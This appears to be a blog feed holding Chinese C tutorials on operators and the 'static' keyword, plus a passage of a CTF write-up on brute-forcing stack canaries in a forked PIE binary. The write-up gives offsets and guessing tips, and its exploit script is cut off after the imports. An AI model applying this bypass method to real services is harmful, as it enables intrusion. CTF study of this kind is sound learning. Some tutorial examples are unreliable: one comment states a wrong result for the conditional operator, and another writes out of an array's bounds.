前置、后置++</span><br><span class="line">* 间接访问操作符(解引用操作符)</span><br><span class="line">(类型) 强制类型转换</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h4 id="六、关系操作符"><a href="#六、关系操作符" class="headerlink" title="六、关系操作符"></a>六、关系操作符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;</span><br><span class="line">&gt;=</span><br><span class="line">&lt;</span><br><span class="line">&lt;=</span><br><span class="line">!= 用于测试“不相等”</span><br><span class="line">== 用于测试“相等”</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>注意：编程过程中不要混淆&#x3D;&#x3D;和&#x3D;，不然会变成bug小子。</p><h4 id="七、逻辑操作符"><a href="#七、逻辑操作符" class="headerlink" title="七、逻辑操作符"></a>七、逻辑操作符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; 逻辑与</span><br><span class="line">|| 逻辑或</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>区分<strong>逻辑与</strong>和<strong>按位与</strong></p><p>区分<strong>逻辑或</strong>和<strong>按位或</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&amp;2-----&gt;0</span><br><span class="line">1&amp;&amp;2----&gt;1</span><br><span class="line">1|2-----&gt;3</span><br><span class="line">1||2----&gt;1</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h4 id="八、条件操作符"><a href="#八、条件操作符" class="headerlink" title="八、条件操作符"></a>八、条件操作符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp1 ? exp2 : exp3</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>懒鬼懒得解释了直接上🌰</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a, b;</span><br><span class="line">    scanf(&quot;%d%d&quot;, &amp;a, &amp;b);</span><br><span class="line">    int c = (a &gt; b) ? a : b;</span><br><span class="line">    printf(&quot;%d&quot;, c);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;//输入5 3 结果为5 输入3 5 结果为3</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h4 id="九、逗号表达式"><a href="#九、逗号表达式" class="headerlink" title="九、逗号表达式"></a>九、逗号表达式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp1, exp2, exp3, …expN</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>逗号表达式，就是用逗号隔开的多个表达式。</p><p>逗号表达式，从左向右依次执行。整个表达式的结果是最后一个表达式的结果。</p><h4 id="十、下标引用、函数调用和结构成员"><a href="#十、下标引用、函数调用和结构成员" class="headerlink" title="十、下标引用、函数调用和结构成员"></a>十、下标引用、函数调用和结构成员</h4><p>\1. [ ] 下标引用操作符</p><p>操作数：一个数组名 + 一个索引值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int arr[6];//创建数组</span><br><span class="line">arr[6] = 10;//实用下标引用操作符。</span><br><span class="line">[ ]的两个操作数是arr和6</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>\2. ( ) 函数调用操作符</p><p>接受一个或者多个操作数：第一个操作数是函数名，剩余的操作数就是传递给函数的参数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hehe\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test2</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">test1(); <span class="comment">//实用（）作为函数调用操作符。</span></span><br><span class="line">test2(<span class="string">&quot;hello bit.&quot;</span>);<span class="comment">//实用（）作为函数调用操作符。</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>\3. 访问一个结构的成员</p><table><thead><tr><th>. - &gt;</th><th>结构体.成员名 结构体指针-&gt;成员名</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> num ;</span><br><span class="line">    <span class="type">char</span> c ;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">S</span> <span class="title">s</span> =</span> &#123;<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s.num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, s.c);</span><br><span class="line">&#125;<span class="comment">//打印出6 a</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> num ;</span><br><span class="line">    <span class="type">char</span> c ;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="keyword">struct</span> S* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, p-&gt;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, p-&gt;c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">S</span> <span class="title">s</span> =</span> &#123;<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>&#125;;</span><br><span class="line">    test(&amp;s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//打印出6 a</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><ol><li><h3 id="操作符属性"><a href="#操作符属性" class="headerlink" title="操作符属性"></a>操作符属性</h3></li></ol><p>*<strong>复杂表达式的求值有三个影响的因素：*</strong></p><p>\1. 操作符的优先级</p><p>\2. 操作符的结合性</p><p>\3. 是否控制求值顺序。</p><p>💫<strong>两个相邻的操作符先执行哪个？取决于他们的优先级；如果两者的优先级相同，取决于他们的结合性。</strong></p><ol><li><h3 id="操作符的优先级"><a href="#操作符的优先级" class="headerlink" title="操作符的优先级"></a>操作符的优先级</h3></li></ol><table><thead><tr><th>操作 符</th><th>描述</th><th>用法示例</th><th>结果类型</th><th>结合性</th><th>是否控制求值顺序</th></tr></thead><tbody><tr><td>（）</td><td>聚组</td><td>（表达式）</td><td>与表达 式同</td><td>N&#x2F;A（不适用）</td><td>否</td></tr><tr><td>（）</td><td>函数调用</td><td>rexp（rexp，…,rexp）</td><td>rexp</td><td>L-R（左到右）</td><td>否</td></tr><tr><td>[ ]</td><td>下标引用</td><td>rexp[rexp]</td><td>lexp</td><td>L-R</td><td>否</td></tr><tr><td>.</td><td>访问结构成员</td><td>lexp.member_name</td><td>lexp</td><td>L-R</td><td>否</td></tr><tr><td>-&gt;</td><td>访问结构指针成员</td><td>rexp-&gt;member_name</td><td>lexp</td><td>L-R</td><td>否</td></tr><tr><td>++</td><td>后缀自增</td><td>lexp ++</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>–</td><td>后缀自减</td><td>lexp –</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>!</td><td>逻辑反</td><td>! rexp</td><td>rexp</td><td>R-L（右到左）</td><td>否</td></tr><tr><td>~</td><td>按位取反</td><td>~ rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>+</td><td>单目，表示正值</td><td>+ rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>-</td><td>单目，表示负值</td><td>- rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>++</td><td>前缀自增</td><td>++ lexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>–</td><td>前缀自减</td><td>– lexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>*</td><td>间接访问</td><td>* rexp</td><td>lexp</td><td>R-L</td><td>否</td></tr><tr><td>&amp;</td><td>取地址</td><td>&amp; lexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>sizeof</td><td>取其长度，以字节 表示</td><td>sizeof rexp sizeof(类 型)</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>(类 型）</td><td>类型转换</td><td>(类型) rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>*</td><td>乘法</td><td>rexp * rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&#x2F;</td><td>除法</td><td>rexp &#x2F; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>%</td><td>整数取余</td><td>rexp % rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>+</td><td>加法</td><td>rexp + rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>-</td><td>减法</td><td>rexp - rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&lt;&lt;</td><td>左移位</td><td>rexp &lt;&lt; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&gt;&gt;</td><td>右移位</td><td>rexp &gt;&gt; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&gt;</td><td>大于</td><td>rexp &gt; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&gt;&#x3D;</td><td>大于等于</td><td>rexp &gt;&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&lt;</td><td>小于</td><td>rexp &lt; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&lt;&#x3D;</td><td>小于等于</td><td>rexp &lt;&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&#x3D;&#x3D;</td><td>等于</td><td>rexp &#x3D;&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>!&#x3D;</td><td>不等于</td><td>rexp !&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&amp;</td><td>位与</td><td>rexp &amp; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>^</td><td>位异或</td><td>rexp ^ rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>|</td><td>位或</td><td>rexp | rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&amp;&amp;</td><td>逻辑与</td><td>rexp &amp;&amp; rexp</td><td>rexp</td><td>L-R</td><td>是</td></tr><tr><td>||</td><td>逻辑或</td><td>rexp || rexp</td><td>rexp</td><td>L-R</td><td>是</td></tr><tr><td>? :</td><td>条件操作符</td><td>rexp ? rexp : rexp</td><td>rexp</td><td>N&#x2F;A</td><td>是</td></tr><tr><td>&#x3D;</td><td>赋值</td><td>lexp &#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>+&#x3D;</td><td>以…加</td><td>lexp +&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>-&#x3D;</td><td>以…减</td><td>lexp -&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>*&#x3D;</td><td>以…乘</td><td>lexp *&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>&#x2F;&#x3D;</td><td>以…除</td><td>lexp &#x2F;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>%&#x3D;</td><td>以…取模</td><td>lexp %&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>&lt;&lt;&#x3D;</td><td>以…左移</td><td>lexp &lt;&lt;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>&gt;&gt;&#x3D;</td><td>以…右移</td><td>lexp &gt;&gt;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>&amp;&#x3D;</td><td>以…与</td><td>lexp &amp;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>^&#x3D;</td><td>以…异或</td><td>lexp ^&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>|&#x3D;</td><td>以…或</td><td>lexp |&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>，</td><td>逗号</td><td>rexp，rexp</td><td>rexp</td><td>L-R</td><td>是</td></tr></tbody></table><p>简单记就是:!&gt;算术运算符&gt;关系运算符符&gt;&amp;&amp;&gt;||&gt;赋值运算符</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C探索碎片——关键字static作用</title>
      <link href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
      <url>/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p>static意译是静态的，而作为C语言中常见的关键字之一，它的用法也贴切“静态”这一含义。</p><h2 id="二、用法"><a href="#二、用法" class="headerlink" title="二、用法"></a>二、用法</h2><ol><li><ul><li><strong>修饰局部变量</strong></li></ul></li></ol><p>下为static是否修饰局部变量对程序运行结果影响的对比。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">play</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">6</span>;</span><br><span class="line">    a++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        play();</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/cb3a80ccb2c62eeceb98bffabadbb269.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>此为上图static未修饰局部变量的运行结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">play</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> a = <span class="number">6</span>;</span><br><span class="line">    a++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        play();</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/4b420992488352dce723db40cb016674.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>此为static修饰局部变量的运行结果</p><p>由上述的对比观察可得：static修饰局部变量时改变了被修饰（静态局部）变量的生命周期。</p><p>我们知道局部变量的生命周期是进作用域开始，出作用域结束，而其作用域是变量所在的局部范围。深入剖析来说，static修饰局部变量时改变了变量的存储类型。将本来存储在栈区的局部变量存放在了静态区。存储类型的改变使得其生命周期变长，但并不影响变量的作用域。</p><h4 id="2-修饰全局变量"><a href="#2-修饰全局变量" class="headerlink" title="2.修饰全局变量"></a>2.修饰全局变量</h4><p>下为static是否修饰全局变量对程序运行结果影响的对比。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b8b3d989de9c69ddbf491862d2066dc0.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><blockquote><p>用extern声明外部符号使得在两个文件中可以达到“一次定义，多次声明”的效果。<br> 注意：extern只能用来声明全局变量！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/1215a0c458837f0883569331440183c5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>当用static修饰全局变量后，程序报错无法运行。</p><p>已知全局变量具有外部链接属性，上图对比分析得：static修饰全局变量之后将其（静态全局变量）外部链接属性变成了内部链接属性。此时的全局变量只能在自己所在的.C文件中使用，对其他文件无法链接使用。即static对全局变量进行修饰改变了其作用域的范围，由原来的整个工程可见变为本源文件可见。</p><h4 id="3-修饰函数"><a href="#3-修饰函数" class="headerlink" title="3.修饰函数"></a>3.修饰函数</h4><p>下为static是否修饰全局变量对程序运行结果影响的对比。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a2a0dd86fadcd5cc30ec0d88437f5fae.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e00d77cdfa029bdbe513811525802465.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>此为为被static修饰时程序运行结果</p><p><img src="https://img-blog.csdnimg.cn/img_convert/436508929245bdfd15f062208af6e666.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>程序报错 无法运行</p><p>函数也具有外部链接属性，由上分析可得相同结论：static修饰函数（静态函数）后将其外部链接属性变为内部链接属性，无法链接使用，只可在自己所在.c文件中使用。</p><h4 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h4><p>static修饰局部变量时将其生命周期延长但作用域未发生改变。</p><p>static修饰全局变量和函数时将其外部链接属性变为内部链接属性，使其只能在所在文件中使用。</p><h4 id="四、补充"><a href="#四、补充" class="headerlink" title="四、补充"></a>四、补充</h4><p>以下内容只为简单提到，后续学习过程中会专门做分享探讨。</p><h5 id="1-有关C语言内存分区"><a href="#1-有关C语言内存分区" class="headerlink" title="1.有关C语言内存分区"></a>1.有关C语言内存分区</h5><p><img src="https://img-blog.csdnimg.cn/img_convert/b90c659e4affce80d1838890434a951f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><h5 id="2-有关C语言三种链接属性"><a href="#2-有关C语言三种链接属性" class="headerlink" title="2.有关C语言三种链接属性"></a>2.有关C语言三种链接属性</h5><p>链接属性（linkage）分为三种——外部（external）、内部（internal）、无（none）。</p><p>注意：*链接属性的改变不会改变作用域。</p><p>*链接属性意味着能不能访问变量及能不能在文件中定义同名变量或函数名。</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary解决姿势</title>
      <link href="/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/"/>
      <url>/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="Canary解决姿势"><a href="#Canary解决姿势" class="headerlink" title="Canary解决姿势"></a><strong>Canary解决姿势</strong></h2><p>被折磨的有点难受 找个时间来斩杀（bushi）又是被虐的一天~<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230627202644.jpg"></p><hr><p><u>有问题请指正~</u>❀<br><u>获取例题请在评论区留言或私信我</u>⭐</p><h4 id="一、canary爆破"><a href="#一、canary爆破" class="headerlink" title="一、canary爆破"></a><strong>一、canary爆破</strong></h4><p>标志提示就算fork函数吧 多线程开攻</p><p><strong>【funcannary】</strong>*</p><p>（1）先运行一下 peda配套checksec<br>                       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002528552.png" alt="image-20230530002528552"><br>                       根据题目提示’have fun’和’welcome’在爆破的exp中会用作于覆盖节点</p><p>​                              ​<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002620435.png" alt="image-20230530002620435"> </p><p>​         发现Canary和PIE都开 准备好爆破（如果有可以利用的字符串canary也可以绕过）<br>​         对应随机化 后续在IDA中只能利用其地址计算偏移</p><p>（2）进IDA </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002919532.png" alt="image-20230530002919532"></p><p>fork接口 &#x3D;&#x3D; canary爆破（多线程）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154247901.png" alt="image-20230530154247901"></p><p>发现函数入口为0x122D 并且发现”&#x2F;bin&#x2F;cat flag” 接下来找溢出位置爆破cannary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154947024.png" alt="image-20230530154947024"></p><p>明显溢出 定位该函数sub_128A（爆破canary的位置）爆破成功后爆返回地址 （爆canary地址的下一位）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530155540402.png" alt="image-20230530155540402"></p><p>函数入口为0x122D shell返回地址为1329 偏移为0xfc(0x1329-0x122D) 覆盖的buf大小为0x68</p><p><strong>tips</strong><br>【1】canary大小为0x00-0xff 所以爆破时每字节需循环257次 又因为canary低三位定为\x00（32位爆破循环3次 64位循环7次）此处需循环7次<br>【2】程序入口点一般都是整数，即地址最低位为00，也就是这里的地址，0x29是可信的。就只要爆破后一位就OK，再后面的地址都相同，爆不爆都一样。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   </span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span 